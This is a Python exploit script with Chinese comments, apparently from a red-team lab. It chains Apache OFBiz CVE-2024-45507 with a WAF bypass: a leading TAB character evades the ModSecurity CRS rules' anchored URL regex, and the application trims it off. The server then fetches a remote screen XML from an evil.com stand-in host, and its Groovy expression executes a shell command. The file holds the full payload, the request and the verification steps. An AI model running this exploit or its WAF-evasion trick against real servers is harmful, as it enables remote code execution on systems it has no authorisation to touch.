# -*- coding: utf-8 -*-
"""RT-3 最小可复现 exp：OFBiz CVE-2024-45507 穿透 WAF(3003/3005/3006, CRS4.29 PL1)。

原理（白盒，ofbiz 容器 /usr/src/apache-ofbiz 只读核查）：
  WAF 3005/3006 正则 (?i)^(?:[a-z][a-z0-9+.\-]*:|//) 锚定"参数值开头"，
  而应用侧 UtilHttp.canonicalizeParameterMap()（getParameterMap()/getCombinedMap() ->
  screen 上下文 parameters 的来源）对值做 split(" ")->逐块规范化->拼接-> **trim()**，
  trim 会剥掉一切前导空白（空格/TAB/CR/LF，<=U+0020）。
  => 值加 1 个前导 TAB（%09）：WAF 锚定失配放行；应用 trim 后 FlexibleLocation
     正常按 http:// 远程拉取 Screen XML -> ${groovy:} 求值 RCE。
  （FlexbaleLocation 本身无 trim，但它拿到的是 canonicalize 之后的值。）

用法: python rt3_bypass_space.py   # 生成载荷 + 经 18381 发一发 + 打印真值核查命令
"""
import io
import os
import subprocess
import sys

import requests
import urllib3

urllib3.disable_warnings()

HERE = os.path.dirname(os.path.abspath(__file__))
WWW = os.path.normpath(os.path.join(HERE, "..", "..", "infrastructure", "www", "payloads"))
MARKER = "pwn_rt3_final"
PAYLOAD = "rt3_final.xml"
URL = "http://evil.com:8000/payloads/" + PAYLOAD          # infra 容器 alias，宿主 127.0.0.1:19080
TARGET = "https://127.0.0.1:18381"                        # 只走 WAF

# 1) 载荷：screen name 必须匹配装饰器名（findTemporalExpression -> TemporalExpressionDecorator）
xml = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
    '        xmlns="http://ofbiz.apache.org/Widget-Screen"'
    ' xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen'
    ' http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
    '    <screen name="TemporalExpressionDecorator">\n'
    '        <section>\n'
    '            <actions>\n'
    "                <set value=\"${groovy:'touch /tmp/%s'.execute();}\"/>\n" % MARKER +
    '            </actions>\n'
    '        </section>\n'
    '    </screen>\n'
    '</screens>\n'
)
io.open(os.path.join(WWW, PAYLOAD), "w", encoding="utf-8", newline="\n").write(xml)
print("[+] payload -> infrastructure/www/payloads/" + PAYLOAD)

# 2) 核心请求：参数值 = "\t" + http URL，手工编码 TAB 为 %09（两侧一致）
s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
body = "tempExprDecoratorLocation=%09" + URL
r = s.post(TARGET + "/webtools/control/main/findTemporalExpression", data=body,
           headers={"Content-Type": "application/x-www-form-urlencoded"},
           timeout=40, allow_redirects=False)
print("[+] POST %s/webtools/control/main/findTemporalExpression" % TARGET)
print("    body: %s" % body)
print("    -> HTTP %s (%dB)" % (r.status_code, len(r.content)))

# 3) 真值核查（只读）
subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1", "ls", "-l", "--full-time",
                "/tmp/" + MARKER])
log = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "3m"],
                     capture_output=True, text=True)
for line in (log.stdout + log.stderr).splitlines():
    if PAYLOAD in line:
        print("[+] infra hit: " + line)
sys.exit(0 if r.status_code == 200 else 1)
